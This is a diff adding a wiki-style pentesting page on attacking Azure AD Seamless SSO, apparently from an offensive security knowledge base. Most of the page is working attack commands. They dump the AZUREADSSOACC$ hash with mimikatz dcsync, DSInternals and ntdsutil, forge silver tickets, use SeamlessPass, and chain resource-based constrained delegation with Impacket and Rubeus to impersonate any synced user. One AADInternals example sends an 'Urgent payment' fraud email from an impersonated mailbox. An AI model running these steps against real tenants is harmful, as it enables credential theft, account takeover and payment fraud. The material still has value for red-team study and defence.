@@ -1,0 +1,196 @@
+# Az - Seamless SSO
+
+## Basic Information
+
+[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) automatically **signs users in when they are on their corporate devices** connected to your corporate network. When enabled, **users don't need to type in their passwords to sign in to Azure AD**, and usually, even type in their usernames. This feature provides your users easy access to your cloud-based applications without needing any additional on-premises components.
+
+<img src="../../../../images/image (275).png" alt=""><figcaption><p><a href="https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works">https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works</a></p></figcaption>
+
+Basically Azure AD Seamless SSO **signs users** in when they are **on a on-prem domain joined PC**.
+
+It's supported by both [**PHS (Password Hash Sync)**](phs-password-hash-sync.md) and [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md).
+
+Desktop SSO is using **Kerberos** for authentication. When configured, Azure AD Connect creates a **computer account called `AZUREADSSOACC$`** in on-prem AD. The password of the `AZUREADSSOACC$` account is **sent as plain-text to Entra ID** during the configuration.
+
+The **Kerberos tickets** are **encrypted** using the **NTHash (MD4)** of the password and Entra ID is using the sent password to decrypt the tickets.
+
+**Entra ID** exposes an **endpoint** (https://autologon.microsoftazuread-sso.com) that accepts Kerberos **tickets**. Domain-joined machine's browser forwards the tickets to this endpoint for SSO.
+
+### Enumeration
+
+```bash
+# Check if the SSO is enabled in the tenant
+Import-Module AADInternals
+Invoke-AADIntReconAsOutsider -Domain <domain name> | Format-Table
+
+# Check if the AZUREADSSOACC$ account exists in the domain
+Install-WindowsFeature RSAT-AD-PowerShell
+Import-Module ActiveDirectory
+Get-ADComputer -Filter "SamAccountName -like 'AZUREADSSOACC$'"
+
+# Check it using raw LDAP queries without needing an external module
+$searcher = New-Object System.DirectoryServices.DirectorySearcher
+$searcher.Filter = "(samAccountName=AZUREADSSOACC`$)"
+$searcher.FindOne()
+```
+
+## Pivoting: On-prem -> cloud
+
+> [!WARNING]
+> The main thing to know about this attack is that just having the TGT or a specific TGS of a user that is synchronized with Entra ID is enough to access the cloud resources.\
+> This is because it's a ticket what is allowing a user to login into the cloud.
+
+In order to obtain that TGS ticket, the attacker needs to have one of the following:
+- **A compromised user's TGS:** If you compromise a user's session with the ticket to `HTTP/autologon.microsoftazuread-sso.com` in memory, you can use it to access the cloud resources.
+- **A compromised user's TGT:** Even if you don't have one but the user was compromised, you can get one using fake TGT delegation trick implemented in many tools such as [Kekeo](https://x.com/gentilkiwi/status/998219775485661184) and [Rubeus](https://posts.specterops.io/rubeus-now-with-more-kekeo-6f57d91079b9).
+- **A compromised user’s hash or password:** SeamlessPass will communicate with the domain controller with this information to generate the TGT and then the TGS.
+- **A golden ticket:** If you have the KRBTGT key, you can create the TGT you need for the attacked user.
+- **The AZUREADSSOACC$ account hash or password:** With this info and the user’s Security Identifier (SID) to attack it's possible to create a service ticket an authenticate with the cloud (as performed in the previous method).
+
+### [**SeamlessPass**](https://github.com/Malcrove/SeamlessPass)
+
+As [explained in this blog post](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/), having any of the previous requirements it's very easy to just use the tool **SeamlessPass** to access the cloud resources as the compromise user, or as any user if you have the **`AZUREADSSOACC$`** account hash or password.
+
+Finally, with the TGT it's possible to use the tool [**SeamlessPass**](https://github.com/Malcrove/SeamlessPass) with:
+
+```bash
+# Using the TGT to access the cloud
+seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_encoded_TGT>
+# Using the TGS to access the cloud
+seamlesspass -tenant corp.com -tgs user_tgs.ccache
+# Using the victims account hash or password to access the cloud
+seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF
+seamlesspass -tenant corp.com -domain corp.local -dc 10.0.1.2 -username user -password password
+# Using the AZUREADSSOACC$ account hash (ntlm or aes) to access the cloud with a specific user SID and domain SID
+seamlesspass -tenant corp.com -adssoacc-ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF -user-sid S-1-5-21-1234567890-1234567890-1234567890-1234
+seamlesspass -tenant corp.com -adssoacc-aes DEADBEEFDEADBEEFDEADBEEFDEADBEEF -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -user-rid 1234
+wmic useraccount get name,sid # Get the user SIDs
+```
+
+Further information to set Firefox to work with seamless SSO can be [**found in this blog post**](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/).
+
+### Getting hashes of the AZUREADSSOACC$ account
+
+The **password** of the user **`AZUREADSSOACC$` never changes**. Therefore, a domain admin could compromise the **hash of this account**, and then use it to **create silver tickets** to connect to Azure with **any on-prem user synced**:
+
+```bash
+# Dump hash using mimikatz
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
+mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
+
+# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
+Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local
+
+# Dump using ntdsutil and DSInternals
+## Dump NTDS.dit
+ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q
+## Extract password
+Install-Module DSInternals
+Import-Module DSInternals
+$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
+(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
+```
+
+> [!NOTE]
+> With the current information you could just use the tool **SeamlessPass** as indicated previously to get azure and entraid tokens for any user in the domain.
+> You could also use the previous techniques (and other) to get the hash of the password of the victim you want to impersonate instead of the `AZUREADSSOACC$` account.
+
+#### Creating Silver Tickets
+
+With the hash you can now **generate silver tickets**:
+
+```bash
+# Get users and SIDs
+Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier
+
+# Create a silver ticket to connect to Azure with mimikatz
+Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:autologon.microsoftazuread-sso.com /service:HTTP /ptt"'
+mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:autologon.microsoftazuread-sso.com /service:HTTP /ptt" exit
+
+# Create silver ticket with AADInternal to access Exchange Online
+$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
+$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
+## Send email
+Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
+```
+
+### Using Silver Tickets with Firefox
+
+To utilize the silver ticket, the following steps should be executed:
+
+1. **Initiate the Browser:** Mozilla Firefox should be launched.
+2. **Configure the Browser:**
+   - Navigate to **`about:config`**.
+   - Set the preference for [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) to the specified [value](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically):
+     - `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
+   - Navigate to Firefox `Settings` > Search for `Allow Windows single sign-on for Microsoft, work and school accounts` and enable it.
+3. **Access the Web Application:**
+   - Visit a web application that is integrated with the organization's AAD domain. A common example is [login.microsoftonline.com](https://login.microsoftonline.com/).
+4. **Authentication Process:**
+   - At the logon screen, the username should be entered, leaving the password field blank.
+   - To proceed, press either TAB or ENTER.
+
+> [!WARNING]
+> This **doesn't bypass MFA if enabled** in the user.
+
+### On-prem -> Cloud via Resource Based Constrained Delegation <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>
+
+To perform the attack is needed:
+
+- `WriteDACL` / `GenericWrite` over `AZUREADSSOACC$`
+- A computer account you control (hash & password) - You could create one
+
+1. Step 1 – Add your own computer account
+   - Creates `ATTACKBOX$` and prints its SID/NTLM hash. Any domain user can do this while MachineAccountQuota > 0
+
+```bash
+# Impacket
+python3 addcomputer.py CONTOSO/bob:'P@ssw0rd!' -dc-ip 10.0.0.10 \
+       -computer ATTACKBOX$ -password S3cureP@ss
+```
+
+2. Step 2 – Grant RBCD on `AZUREADSSOACC$` - Writes your machine’s SID into `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+
+```bash
+python3 rbcd.py CONTOSO/bob:'P@ssw0rd!'@10.0.0.10 \
+       ATTACKBOX$ AZUREADSSOACC$
+
+# Or, from Windows:
+$SID = (Get-ADComputer ATTACKBOX$).SID
+Set-ADComputer AZUREADSSOACC$ `
+  -PrincipalsAllowedToDelegateToAccount $SID
+```
+
+3. Step 3 – Forge a TGS for any user (e.g. alice)
+
+```bash
+# Using your machine's password or NTLM hash
+python3 getST.py -dc-ip 192.168.1.10 \
+       -spn HTTP/autologon.microsoftazuread-sso.com \
+       -impersonate alice \
+       DOMAIN/ATTACKBOX$ -hashes :9b3c0d06d0b9a6ef9ed0e72fb2b64821
+
+# Produces alice.autologon.ccache
+
+#Or, from Windows:
+Rubeus s4u /user:ATTACKBOX$ /rc4:9b3c0d06d0b9a6ef9ed0e72fb2b64821 `
+       /impersonateuser:alice `
+       /msdsspn:"HTTP/autologon.microsoftazuread-sso.com" /dc:192.168.1.10 /ptt
+```
+
+You can now use the **TGS to access Azure resources as the impersonated user.**
+
+### ~~Creating Kerberos tickets for cloud-only users~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>
+
+If the Active Directory administrators have access to Azure AD Connect, they can **set SID for any cloud-user**. This way Kerberos **tickets** can be **created also for cloud-only users**. The only requirement is that the SID is a proper [SID](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824(v=ws.10)>).
+
+> [!CAUTION]
+> Changing SID of cloud-only admin users is now **blocked by Microsoft**.\
+> For info check [https://aadinternals.com/post/on-prem_admin/](https://aadinternals.com/post/on-prem_admin/)
+
+## References
+
+- [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso)
+- [https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
+- [https://aadinternals.com/post/on-prem_admin/](https://aadinternals.com/post/on-prem_admin/)
+- [TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg)
